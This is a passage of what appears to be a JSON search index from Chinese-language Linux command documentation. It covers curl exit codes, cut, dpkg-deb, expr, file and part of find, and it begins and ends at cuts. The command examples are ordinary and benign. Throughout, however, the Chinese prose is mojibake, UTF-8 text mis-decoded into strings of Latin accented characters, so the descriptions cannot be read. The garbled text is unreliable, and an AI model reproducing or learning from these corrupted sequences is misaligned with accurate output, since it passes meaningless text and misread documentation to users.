æ³•è·å–æ‚¨æƒ³è¦çš„ç‰¹å®šèµ„æºæˆ–ç›®å½•ã€‚æœ€æœ‰å¯ èƒ½çš„æ˜¯æ‚¨è¯•å›¾è¿›å…¥ä¸€ä¸ªåœ¨æ­¤æœåŠ¡å™¨ä¸Šä¸å­˜åœ¨çš„ç›®å½•ã€‚ 11 FTPå¯†ç é”™è¯¯ FTP éæ­£å¸¸çš„PASS å›å¤ã€‚cURL æ— æ³•è§£æå‘é€åˆ°PASS è¯·æ±‚çš„åº”ç­”ã€‚ 13 ç»“æœé”™è¯¯ FTP éæ­£å¸¸çš„çš„PASV åº”ç­”ï¼ŒcURL æ— æ³•è§£æå‘é€åˆ°PASV è¯·æ±‚çš„åº”ç­”ã€‚ 14 FTPå›åº”PASVå‘½ä»¤ FTP éæ­£å¸¸çš„227æ ¼å¼ã€‚cURL æ— æ³•è§£ææœåŠ¡å™¨å‘é€çš„227è¡Œã€‚ 15 å†…éƒ¨æ•…éšœ FTP æ— æ³•è¿æ¥åˆ°ä¸»æœºã€‚æ— æ³•è§£æåœ¨227è¡Œä¸­è·å–çš„ä¸»æœºIPã€‚ 17 è®¾ç½®ä¼ è¾“æ¨¡å¼ä¸ºäºŒè¿›åˆ¶ FTP æ— æ³•è®¾å®šä¸ºäºŒè¿›åˆ¶ä¼ è¾“ã€‚æ— æ³•æ”¹å˜ä¼ è¾“æ–¹å¼åˆ°äºŒè¿›åˆ¶ã€‚ 18 æ–‡ä»¶ä¼ è¾“çŸ­æˆ–å¤§äºé¢„æœŸ éƒ¨åˆ†æ–‡ä»¶ã€‚åªæœ‰éƒ¨åˆ†æ–‡ä»¶è¢«ä¼ è¾“ã€‚ 19 RETRå‘½ä»¤ä¼ è¾“å®Œæˆ FTP ä¸èƒ½ä¸‹è½½/è®¿é—®ç»™å®šçš„æ–‡ä»¶ï¼Œ RETR (æˆ–ç±»ä¼¼)å‘½ä»¤å¤±è´¥ã€‚ 21 å‘½ä»¤æˆåŠŸå®Œæˆ FTP quote é”™è¯¯ã€‚quote å‘½ä»¤ä»æœåŠ¡å™¨è¿”å›é”™è¯¯ã€‚ 22 è¿”å›æ­£å¸¸ HTTP æ‰¾ä¸åˆ°ç½‘é¡µã€‚æ‰¾ä¸åˆ°æ‰€è¯·æ±‚çš„URL æˆ–è¿”å›å¦ä¸€ä¸ªHTTP 400æˆ–ä»¥ä¸Šé”™è¯¯ã€‚ æ­¤è¿”å›ä»£ç åªå‡ºç°åœ¨ä½¿ç”¨äº†-f/--fail é€‰é¡¹ä»¥åã€‚ 23 æ•°æ®å†™å…¥å¤±è´¥ å†™å…¥é”™è¯¯ã€‚cURL æ— æ³•å‘æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç±»ä¼¼ç›®çš„å†™å…¥æ•°æ®ã€‚ 25 æ— æ³•å¯åŠ¨ä¸Šä¼  FTP æ— æ³•STOR æ–‡ä»¶ã€‚æœåŠ¡å™¨æ‹’ç»äº†ç”¨äºFTP ä¸Šä¼ çš„STOR æ“ä½œã€‚ 26 å›è°ƒé”™è¯¯ è¯»é”™è¯¯ã€‚å„ç±»è¯»å–é—®é¢˜ã€‚ 27 å†…å­˜åˆ†é…è¯·æ±‚å¤±è´¥ å†…å­˜ä¸è¶³ã€‚å†…å­˜åˆ†é…è¯·æ±‚å¤±è´¥ã€‚ 28 è®¿é—®è¶…æ—¶ æ“ä½œè¶…æ—¶ã€‚åˆ°è¾¾æŒ‡å®šçš„è¶…æ—¶æœŸé™æ¡ä»¶ã€‚ 30 FTPç«¯å£é”™è¯¯ FTP PORT å¤±è´¥ã€‚PORT å‘½ä»¤å¤±è´¥ã€‚å¹¶éæ‰€æœ‰çš„FTP æœåŠ¡å™¨æ”¯æŒPORT å‘½ä»¤ï¼Œè¯· å°è¯•ä½¿ç”¨è¢«åŠ¨(PASV)ä¼ è¾“ä»£æ›¿ï¼ 31 FTPé”™è¯¯ FTP æ— æ³•ä½¿ç”¨REST å‘½ä»¤ã€‚REST å‘½ä»¤å¤±è´¥ã€‚æ­¤å‘½ä»¤ç”¨æ¥æ¢å¤çš„FTP ä¼ è¾“ã€‚ 33 ä¸æ”¯æŒè¯·æ±‚ HTTP range é”™è¯¯ã€‚range \"å‘½ä»¤\"ä¸èµ·ä½œç”¨ã€‚ 34 å†…éƒ¨å‘ç”Ÿé”™è¯¯ HTTP POST é”™è¯¯ã€‚å†…éƒ¨POST è¯·æ±‚äº§ç”Ÿé”™è¯¯ã€‚ 35 SSL/TLSæ¡æ‰‹å¤±è´¥ SSL è¿æ¥é”™è¯¯ã€‚SSL æ¡æ‰‹å¤±è´¥ã€‚ 36 ä¸‹è½½æ— æ³•æ¢å¤ FTP ç»­ä¼ æŸåã€‚ä¸èƒ½ç»§ç»­æ—©äº›æ—¶å€™è¢«ä¸­æ­¢çš„ä¸‹è½½ã€‚ 37 æ–‡ä»¶æƒé™é”™è¯¯ æ–‡ä»¶æ— æ³•è¯»å–ã€‚æ— æ³•æ‰“å¼€æ–‡ä»¶ã€‚æƒé™é—®é¢˜ï¼Ÿ 38 LDAPå¯æ²¡æœ‰çº¦æŸåŠ› LDAP æ— æ³•ç»‘å®šã€‚LDAP ç»‘å®š(bind)æ“ä½œå¤±è´¥ã€‚ 39 LDAPæœç´¢å¤±è´¥ LDAP æœç´¢å¤±è´¥ã€‚ 41 å‡½æ•°æ²¡æœ‰æ‰¾åˆ° åŠŸèƒ½æ— æ³•æ‰¾åˆ°ã€‚æ— æ³•æ‰¾åˆ°å¿…è¦çš„LDAP åŠŸèƒ½ã€‚ 42 ä¸­æ­¢çš„å›è°ƒ ç”±å›è°ƒç»ˆæ­¢ã€‚åº”ç”¨ç¨‹åºå‘ŠçŸ¥cURL ç»ˆæ­¢è¿ä½œã€‚ 43 å†…éƒ¨é”™è¯¯ å†…éƒ¨é”™è¯¯ã€‚ç”±ä¸€ä¸ªä¸æ­£ç¡®å‚æ•°è°ƒç”¨äº†åŠŸèƒ½ã€‚ 45 æ¥å£é”™è¯¯ æ¥å£é”™è¯¯ã€‚æŒ‡å®šçš„å¤–å‘æ¥å£æ— æ³•ä½¿ç”¨ã€‚ 47 è¿‡å¤šçš„é‡å®šå‘ è¿‡å¤šçš„é‡å®šå‘ã€‚cURL è¾¾åˆ°äº†è·Ÿéšé‡å®šå‘è®¾å®šçš„æœ€å¤§é™é¢è·Ÿ 48 æ— æ³•è¯†åˆ«é€‰é¡¹ æŒ‡å®šäº†æœªçŸ¥TELNET é€‰é¡¹ã€‚ 49 TELNETæ ¼å¼é”™è¯¯ ä¸åˆå¼çš„telnet é€‰é¡¹ã€‚ 51 è¿œç¨‹æœåŠ¡å™¨çš„SSLè¯ä¹¦ peer çš„SSL è¯ä¹¦æˆ–SSH çš„MD5æŒ‡çº¹æ²¡æœ‰ç¡®å®šã€‚ 52 æœåŠ¡å™¨æ— è¿”å›å†…å®¹ æœåŠ¡å™¨æ— ä»»ä½•åº”ç­”ï¼Œè¯¥æƒ…å†µåœ¨æ­¤å¤„è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”™è¯¯ã€‚ 53 åŠ å¯†å¼•æ“æœªæ‰¾åˆ° æ‰¾ä¸åˆ°SSL åŠ å¯†å¼•æ“ã€‚ 54 è®¾å®šé»˜è®¤SSLåŠ å¯†å¤±è´¥ æ— æ³•å°†SSL åŠ å¯†å¼•æ“è®¾ç½®ä¸ºé»˜è®¤ã€‚ 55 æ— æ³•å‘é€ç½‘ç»œæ•°æ® å‘é€ç½‘ç»œæ•°æ®å¤±è´¥ã€‚ 56 è¡°ç«­æ¥æ”¶ç½‘ç»œæ•°æ® åœ¨æ¥æ”¶ç½‘ç»œæ•°æ®æ—¶å¤±è´¥ã€‚ 57 58 æœ¬åœ°å®¢æˆ·ç«¯è¯ä¹¦ æœ¬åœ°è¯ä¹¦æœ‰é—®é¢˜ã€‚ 59 æ— æ³•ä½¿ç”¨å¯†ç  æ— æ³•ä½¿ç”¨æŒ‡å®šçš„SSL å¯†ç ã€‚ 60 å‡­è¯æ— æ³•éªŒè¯ peer è¯ä¹¦æ— æ³•è¢«å·²çŸ¥çš„CA è¯ä¹¦éªŒè¯ã€‚ 61 æ— æ³•è¯†åˆ«çš„ä¼ è¾“ç¼–ç  æ— æ³•è¾¨è¯†çš„ä¼ è¾“ç¼–ç ã€‚ 62 æ— æ•ˆçš„LDAP URL æ— æ•ˆçš„LDAP URLã€‚ 63 æ–‡ä»¶è¶…è¿‡æœ€å¤§å¤§å° è¶…è¿‡æœ€å¤§æ–‡ä»¶å°ºå¯¸ã€‚ 64 FTPå¤±è´¥ è¦æ±‚çš„FTP çš„SSL æ°´å¹³å¤±è´¥ã€‚ 65 å€’å¸¦æ“ä½œå¤±è´¥ å‘é€æ­¤æ•°æ®éœ€è¦çš„å›å·(rewind)å¤±è´¥ã€‚ 66 SSLå¼•æ“å¤±è´¥ åˆå§‹åŒ–SSL å¼•æ“å¤±è´¥ã€‚ 67 æœåŠ¡å™¨æ‹’ç»ç™»å½• ç”¨æˆ·åã€å¯†ç æˆ–ç±»ä¼¼çš„ä¿¡æ¯æœªè¢«æ¥å—ï¼ŒcURL ç™»å½•å¤±è´¥ã€‚ 68 æœªæ‰¾åˆ°æ–‡ä»¶ åœ¨TFTP æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚ 69 æ— æƒé™ TFTP æœåŠ¡å™¨æƒé™æœ‰é—®é¢˜ã€‚ 70 è¶…å‡ºæœåŠ¡å™¨ç£ç›˜ç©ºé—´ TFTP æœåŠ¡å™¨ç£ç›˜ç©ºé—´ä¸è¶³ã€‚ 71 éæ³•TFTPæ“ä½œ éæ³•çš„TFTP æ“ä½œã€‚ 72 æœªçŸ¥TFTPä¼ è¾“çš„ID æœªçŸ¥TFTP ä¼ è¾“ç¼–å·(ID)ã€‚ 73 æ–‡ä»¶å·²ç»å­˜åœ¨ æ–‡ä»¶å·²å­˜åœ¨(TFTP) ã€‚ 74 é”™è¯¯TFTPæœåŠ¡å™¨ æ— æ­¤ç”¨æˆ·(TFTP) ã€‚ 75 å­—ç¬¦è½¬æ¢å¤±è´¥ å­—ç¬¦è½¬æ¢å¤±è´¥ã€‚ 76 å¿…é¡»è®°å½•å›è°ƒ éœ€è¦å­—ç¬¦è½¬æ¢åŠŸèƒ½ã€‚ 77 CAè¯ä¹¦æƒé™ è¯»SSL è¯ä¹¦å‡ºç°é—®é¢˜(è·¯å¾„ï¼Ÿè®¿é—®æƒé™ï¼Ÿ ) ã€‚ 78 URLä¸­å¼•ç”¨èµ„æºä¸å­˜åœ¨ URL ä¸­å¼•ç”¨çš„èµ„æºä¸å­˜åœ¨ã€‚ 79 é”™è¯¯å‘ç”Ÿåœ¨SSHä¼šè¯ SSH ä¼šè¯æœŸé—´å‘ç”Ÿä¸€ä¸ªæœªçŸ¥é”™è¯¯ã€‚ 80 æ— æ³•å…³é—­SSLè¿æ¥ æœªèƒ½å…³é—­SSL è¿æ¥ã€‚ 81 æœåŠ¡æœªå‡†å¤‡ 82 æ— æ³•è½½å…¥CRLæ–‡ä»¶ æ— æ³•åŠ è½½CRL æ–‡ä»¶ï¼Œä¸¢å¤±æˆ–æ ¼å¼ä¸æ­£ç¡®(åœ¨7.19.0ç‰ˆä¸­å¢åŠ ) ã€‚ 83 å‘è¡Œäººæ£€æŸ¥å¤±è´¥ ç­¾å‘æ£€æŸ¥å¤±è´¥(åœ¨7.19.0ç‰ˆä¸­å¢åŠ ) ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-curl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-curl.html"},{"title":"cut","text":"æ˜¾ç¤ºè¡Œä¸­çš„æŒ‡å®šéƒ¨åˆ†ï¼Œåˆ é™¤æ–‡ä»¶ä¸­æŒ‡å®šå­—æ®µã€‚ è¯­æ³•: cutï¼ˆé€‰é¡¹ï¼‰ï¼ˆå‚æ•°ï¼‰ é€‰é¡¹ -b ä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šç›´æ¥èŒƒå›´çš„ å­—èŠ‚ å†…å®¹ï¼› -c ä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šèŒƒå›´çš„ å­—ç¬¦ ï¼› -d æŒ‡å®šå­—æ®µçš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤çš„å­—æ®µåˆ†éš”ç¬¦ä¸º\"TAB\"ï¼› -f æ˜¾ç¤ºæŒ‡å®š å­—æ®µ ï¼ˆæŒ‡å®šåˆ—ï¼‰çš„å†…å®¹ï¼› -n ä¸\"-b\"é€‰é¡¹è¿ç”¨ï¼Œä¸åˆ†å‰²å¤šå­—èŠ‚å­—ç¬¦ï¼› --complement è¡¥è¶³è¢«é€‰æ‹©çš„å­—èŠ‚ã€å­—ç¬¦æˆ–å­—æ®µï¼› --out-delimiter= <å­—æ®µåˆ†éš”ç¬¦> æŒ‡å®šè¾“å‡ºå†…å®¹æ˜¯çš„å­—æ®µåˆ†å‰²ç¬¦ï¼› å­—èŠ‚å­—ç¬¦å¦‚ä½•å†™å‚æ•° N-ï¼šä»ç¬¬Nä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç»“å°¾ï¼› N-Mï¼šä»ç¬¬Nä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç¬¬Mä¸ªï¼ˆåŒ…æ‹¬Måœ¨å†…ï¼‰å­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µï¼› -Mï¼šä»ç¬¬1ä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç¬¬Mä¸ªï¼ˆåŒ…æ‹¬Måœ¨å†…ï¼‰å­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µã€‚ ä¾‹-ä»æ–‡ä»¶ä¸­æå–ç¬¬ä¸‰åˆ—å¹¶æ‰“å°: cut -f3 file.txt æ”¯æŒå¤šåˆ—, å¦‚ç¬¬3, 4åˆ—æ‰“å°: cut -f3,4 file.txt cutå‘½ä»¤é»˜è®¤ä½¿ç”¨åˆ¶è¡¨ç¬¦ä½œä¸ºå­—æ®µåˆ†éš”ç¬¦ã€‚ å¦‚æœæ‚¨çš„æ•°æ®ä½¿ç”¨å…¶ä»–åˆ†éš”ç¬¦ï¼Œä¾‹å¦‚é€—å·æˆ–ç©ºæ ¼ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ -d é€‰é¡¹æŒ‡å®šåˆ†éš”ç¬¦ã€‚ ä¾‹å¦‚ï¼Œå¯¹äºä»¥é€—å·åˆ†éš”çš„æ•°æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: cut -d',' -f3 file.csv æ³¨è§£ åœ¨MacOSä¸Š(å…¶ä»–ç³»ç»Ÿä¸ç¡®å®š), å¯¹äºè¿ç»­ç©ºæ ¼è¯†åˆ«æœ‰ç‚¹é—®é¢˜, å¦‚: echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -f3 çš„ç»“æœæ˜¯æ‰“å°æ•´ä¸ªè¡Œ; è€Œ: echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -d ' ' -f3 çš„è¾“å‡ºæ˜¯ç©º; åªæœ‰è¿™æ ·çš„æ‰èƒ½æ­£å¸¸å¤„ç†: $ echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -d ' ' -f3 57da161f45ac ä¸çŸ¥é“æ˜¯ä¸æ˜¯tabè¯†åˆ«æœ‰é—®é¢˜...","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cut.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cut.html"},{"title":"dpkg-deb","text":"dpkg-deb æä¾›äº†å®Œæ•´çš„ deb åŒ…åˆ›å»ºå’Œæ“ä½œåŠŸèƒ½, æä¾›æ‰“åŒ…ã€è§£åŒ…ã€æŸ¥è¯¢ deb ä¿¡æ¯ç­‰åŠŸèƒ½ æ˜¯ deb åŒ…ç®¡ç†ä¸å¯æˆ–ç¼ºçš„å·¥å…· å¸¸è§ç”¨æ³•å’Œé€‰é¡¹åŒ…æ‹¬: è§£åŒ… deb: dpkg-deb -x package.deb unpack/ :è§£å‹ deb åˆ°æŒ‡å®šç›®å½• dpkg-deb -R package.deb unpack/ :é€’å½’è§£å‹ deb åŠæ•°æ®åˆ°æŒ‡å®šç›®å½• æ‰“åŒ… deb: dpkg-deb -b directory package.deb :å°†ç›®å½•æ‰“åŒ…ç”Ÿæˆ deb æ–‡ä»¶ dpkg-deb -Z gzip -b dir package.deb :æ‰“åŒ…æ—¶ä½¿ç”¨ gzip å‹ç¼© æŸ¥çœ‹ä¿¡æ¯: dpkg-deb -I package.deb :æ˜¾ç¤º deb çš„è¯¦ç»†ä¿¡æ¯ dpkg-deb -c package.deb :åˆ—å‡º deb ä¸­çš„æ–‡ä»¶åˆ—è¡¨ dpkg-deb -f package.deb :æ˜¾ç¤ºæ‰“åŒ…æ–‡ä»¶å éªŒè¯: dpkg-deb -W package.deb:éªŒè¯ deb æ–‡ä»¶çš„å®Œæ•´æ€§ æ§åˆ¶å­—æ®µ: --field=Field:Name :è®¾ç½®æŒ‡å®šæ§åˆ¶å­—æ®µä¸º Name --field=Field: :åˆ é™¤æŒ‡å®šæ§åˆ¶å­—æ®µ è§£å‹ä½¿ç”¨-xä¸-RåŒºåˆ« ä½¿ç”¨ -xè§£å‹çš„vscodeåŒ…æ²¡æœ‰ DEBIANç›®å½•, ä½¿ç”¨ -Rè§£å‹çš„æœ‰ è§£åŒ…è¡Œä¸ºç•¥æœ‰ä¸åŒ: -x é€‰é¡¹è¿›è¡Œè§£åŒ…æ—¶,åªä¼šè§£å‹ deb åŒ…ä¸­çš„ data.tar.* æ–‡ä»¶,ä¹Ÿå°±æ˜¯è½¯ä»¶çš„å®é™…æ–‡ä»¶ã€‚ è€Œ -R é€‰é¡¹è§£åŒ…æ—¶,ä¸ä»…ä¼šè§£å‹ data.tar. ,è¿˜ä¼šé¢å¤–è§£å‹ control.tar. æ–‡ä»¶ã€‚ control.tar.* ä¸­åŒ…å«äº† deb åŒ…çš„æ§åˆ¶ä¿¡æ¯,å…¶ä¸­å°±åŒ…æ‹¬ /DEBIAN ç›®å½•å’Œ control ç­‰æ–‡ä»¶ã€‚ è¿™ä¸»è¦æ˜¯å› ä¸ºåœ¨å¤šæ•°æƒ…å†µä¸‹,æˆ‘ä»¬è§£åŒ…åªæ˜¯ä¸ºäº†è·å–è½¯ä»¶æ–‡ä»¶æœ¬èº«,è€Œä¸éœ€è¦æ§åˆ¶ä¿¡æ¯ã€‚ æ‰€ä»¥ -x æä¾›äº†æ›´ç®€å•çš„è§£åŒ…æ–¹å¼ã€‚ ä½†åœ¨éœ€è¦å®Œæ•´è§£å‹è°ƒè¯• deb åŒ…å†…éƒ¨ç»“æ„æ—¶,-R è§£åŒ…åˆ™å¯ä»¥æä¾›å®Œæ•´çš„å†…å®¹ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dpkg-deb.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dpkg-deb.html"},{"title":"expr","text":"æ‰‹å·¥å‘½ä»¤è¡Œè®¡æ•°å™¨ï¼Œç”¨äºåœ¨UNIX/LINUXä¸‹æ±‚è¡¨è¾¾å¼å˜é‡çš„å€¼ï¼Œä¸€èˆ¬ç”¨äºæ•´æ•°å€¼ï¼Œä¹Ÿå¯ç”¨äºå­—ç¬¦ä¸²ã€‚ è¯­æ³•: expr è¡¨è¾¾å¼ è¡¨è¾¾å¼è¯´æ˜: ç”¨ç©ºæ ¼éš”å¼€æ¯ä¸ªé¡¹ï¼› ç”¨åæ–œæ  æ”¾åœ¨ shell ç‰¹å®šçš„å­—ç¬¦å‰é¢ï¼› å¯¹åŒ…å«ç©ºæ ¼å’Œå…¶ä»–ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²è¦ç”¨å¼•å·æ‹¬èµ·æ¥ ä¾‹ è®¡ç®—å­—ä¸²é•¿åº¦: > expr length \"this is a test\" 14 æŠ“å–å­—ä¸²: > expr substr \"this is a test\" 3 5 is is æŠ“å–ç¬¬ä¸€ä¸ªå­—ç¬¦æ•°å­—ä¸²å‡ºç°çš„ä½ç½®: > expr index \"sarasara\" a 2 æ•´æ•°è¿ç®—: > expr 14 % 9 5 > expr 10 + 10 20 > expr 1000 + 900 1900 > expr 30 / 3 / 2 5 > expr 30 \\* 3 (ä½¿ç”¨ä¹˜å·æ—¶ï¼Œå¿…é¡»ç”¨åæ–œçº¿å±è”½å…¶ç‰¹å®šå«ä¹‰ã€‚å› ä¸ºshellå¯èƒ½ä¼šè¯¯è§£æ˜¾ç¤ºæ˜Ÿå·çš„æ„ä¹‰) 90 > expr 30 * 3 expr: Syntax error è¡¥å…… ç­‰ä»·: ((i=$j+$k)) ç­‰ä»·äº i=`expr $j + $k` ((i=$j-$k)) ç­‰ä»·äº i=`expr $j -$k` ((i=$j*$k)) ç­‰ä»·äº i=`expr $j \\*$k` ((i=$j/$k)) ç­‰ä»·äº i=`expr $j /$k` Let expressions æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼ã€‚è¡¨è¾¾å¼ä¸­çš„å˜é‡å‰ä¸å¿…æœ‰$.å¦‚æœè¡¨è¾¾å¼ä¸­åŒ…å«äº†ç©ºæ ¼æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™å¿…é¡»å¼•èµ·æ¥ã€‚ ä¾‹: let \"I = I + 1\" æˆ– let i=i+1","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exprr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exprr.html"},{"title":"file","text":"è¾¨è¯†æ–‡ä»¶ç±»å‹ è¯­æ³•: file [-bcLvz][-f <åç§°æ–‡ä»¶>][-m <é­”æ³•æ•°å­—æ–‡ä»¶>...][æ–‡ä»¶æˆ–ç›®å½•...] é€‰é¡¹å‚æ•° å¸¸ç”¨: -b åˆ—å‡ºè¾¨è¯†ç»“æœæ—¶ï¼Œä¸æ˜¾ç¤ºæ–‡ä»¶åç§°ã€‚ -c è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼Œä¾¿äºæ’é”™æˆ–åˆ†æç¨‹åºæ‰§è¡Œçš„æƒ…å½¢ã€‚ -f<åç§°æ–‡ä»¶> æŒ‡å®šåç§°æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åç§°æ—¶ï¼Œè®©fileä¾åºè¾¨è¯†è¿™äº›æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªæ–‡ä»¶åç§°ã€‚ -L ç›´æ¥æ˜¾ç¤ºç¬¦å·è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶çš„ç±»åˆ«ã€‚ -m<é­”æ³•æ•°å­—æ–‡ä»¶> æŒ‡å®šé­”æ³•æ•°å­—æ–‡ä»¶ã€‚ -v æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -z å°è¯•å»è§£è¯»å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ [æ–‡ä»¶æˆ–ç›®å½•...] è¦ç¡®å®šç±»å‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¤šä¸ªæ–‡ä»¶ä¹‹é—´ä½¿ç”¨ç©ºæ ¼åˆ†å¼€ï¼Œå¯ä»¥ä½¿ç”¨shellé€šé…ç¬¦åŒ¹é…å¤šä¸ªæ–‡ä»¶ã€‚ æ‰€æœ‰ --help display this help and exit -v , --version output version information and exit -m , --magic-file LIST use LIST as a colon-separated list of magic number files -M LIST use LIST as a colon-separated list of magic number files in place of default LIST use LIST as a colon-separated list of magic number files in place of default -z , --uncompress try to look inside compressed files -Z , --uncompress-noreport only print the contents of compressed files -b , --brief do not prepend filenames to output lines -c , --checking-printout print the parsed form of the magic file, use in conjunction with -m to debug a new magic file before installing it -d use default magic file use default magic file -e , --exclude TEST exclude TEST from the list of test to be performed for file. Valid tests are: apptype, ascii, cdf, compress, csv, elf, encoding, soft, tar, json, text, tokens --exclude-quiet TEST like exclude, but ignore unknown tests -f , --files-from FILE read the filenames to be examined from FILE -F , --separator STRING use string as separator instead of : -i do not further classify regular files do not further classify regular files -I , --mime output MIME type strings (--mime-type and --mime-encoding) --extension output a slash-separated list of extensions --mime-type output the MIME type --mime-encoding output the MIME encoding -k , --keep-going don't stop at the first match -l , --list list magic strength -L , --dereference follow symlinks -h , --no-dereference don't follow symlinks (default) -n , --no-buffer do not buffer output -N , --no-pad do not pad output -0 , --print0 terminate filenames with ASCII NUL -p , --preserve-date preserve access times on files -P , --parameter set file engine parameter limits bytes 1048576 max bytes to look inside file elf_notes 256 max ELF notes processed elf_phnum 2048 max ELF prog sections processed elf_shnum 32768 max ELF sections processed encoding 65536 max bytes to scan for encoding indir 50 recursion limit for indirection name 60 use limit for name/use magic regex 8192 length limit for REGEX searches -r , --raw don't translate unprintable chars to ooo -s , --special-files treat special (block/char devices) files as ordinary ones -S , --no-sandbox disable system call sandboxing -C , --compile compile file specified by -m -D , --debug print debugging messages ç”¨ä¾‹ æŸ¥çœ‹æ–‡ä»¶ç›¸å…³ä¿¡æ¯: yanque@yanquedembp Downloads % file * $RECYCLE.BIN: directory movie: directory mushenji2.txt: Non-ISO extended-ASCII text, with very long lines (638), with CRLF line terminators æŸ¥çœ‹æ–‡ä»¶ç¼–ç : yanque@yanquedembp Downloads % file --mime-encoding * $RECYCLE.BIN: binary movie: binary mushenji2.txt: unknown-8bit mushenji.txt: utf-8","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-file.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-file.html"},{"title":"find","text":"åœ¨æŒ‡å®šç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ã€‚ ä»»ä½•ä½äºå‚æ•°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½å°†è¢«è§†ä¸ºæ¬²æŸ¥æ‰¾çš„ç›®å½•åã€‚ å¦‚æœä½¿ç”¨è¯¥å‘½ä»¤æ—¶ï¼Œä¸è®¾ç½®ä»»ä½•å‚æ•°ï¼Œåˆ™ find å‘½ä»¤å°†åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾å­ç›®å½•ä¸æ–‡ä»¶ã€‚å¹¶ä¸”å°†æŸ¥æ‰¾åˆ°çš„å­ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨è¿›è¡Œæ˜¾ç¤ºã€‚ è¯­æ³•: find path -option [ -print ] [ -exec -ok command ] {} \\; find æ ¹æ®ä¸‹åˆ—è§„åˆ™åˆ¤æ–­ path å’Œ expressionï¼Œåœ¨å‘½ä»¤åˆ—ä¸Šç¬¬ä¸€ä¸ª - ( ) , ! ä¹‹å‰çš„éƒ¨ä»½ä¸º pathï¼Œä¹‹åçš„æ˜¯ expressionã€‚å¦‚æœ path æ˜¯ç©ºå­—ä¸²åˆ™ä½¿ç”¨ç›®å‰è·¯å¾„ï¼Œå¦‚æœ expression æ˜¯ç©ºå­—ä¸²åˆ™ä½¿ç”¨ -print ä¸ºé¢„è®¾ expressionã€‚ expression ä¸­å¯ä½¿ç”¨çš„é€‰é¡¹æœ‰äºŒä¸‰åä¸ªä¹‹å¤šï¼Œåœ¨æ­¤åªä»‹ç»æœ€å¸¸ç”¨çš„éƒ¨ä»½ã€‚ åŒ¹é…æ–¹å¼ -mount, -xdev åªæ£€æŸ¥å’ŒæŒ‡å®šç›®å½•åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸‹çš„æ–‡ä»¶ï¼Œé¿å…åˆ—å‡ºå…¶å®ƒæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ -amin n åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«è¯»å–è¿‡ -anewer file æ¯”æ–‡ä»¶ file æ›´æ™šè¢«è¯»å–è¿‡çš„æ–‡ä»¶ -atime n åœ¨è¿‡å» n å¤©å†…è¢«è¯»å–è¿‡çš„æ–‡ä»¶ -cmin n åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«ä¿®æ”¹è¿‡ -cnewer file æ¯”æ–‡ä»¶ file æ›´æ–°çš„æ–‡ä»¶ -ctime n åœ¨è¿‡å» n å¤©å†…åˆ›å»ºçš„æ–‡ä»¶ -mtime n åœ¨è¿‡å» n å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶. nä¸ºæ•°å­—ï¼Œè¡¨ç¤ºnå¤©ä¹‹å‰çš„ã€ä¸€å¤©ä¹‹å†…ã€‘è¢«æ”¹åŠ¨è¿‡çš„æ–‡ä»¶ -empty ç©ºçš„æ–‡ä»¶-gid n or -group name, gid æ˜¯ n æˆ–æ˜¯ group åç§°æ˜¯ name -ipath p, -path p è·¯å¾„åç§°ç¬¦åˆ p çš„æ–‡ä»¶ï¼Œipath ä¼šå¿½ç•¥å¤§å°å†™ -name name, -iname name æ–‡ä»¶åç§°ç¬¦åˆ name çš„æ–‡ä»¶ã€‚iname ä¼šå¿½ç•¥å¤§å°å†™ -size n 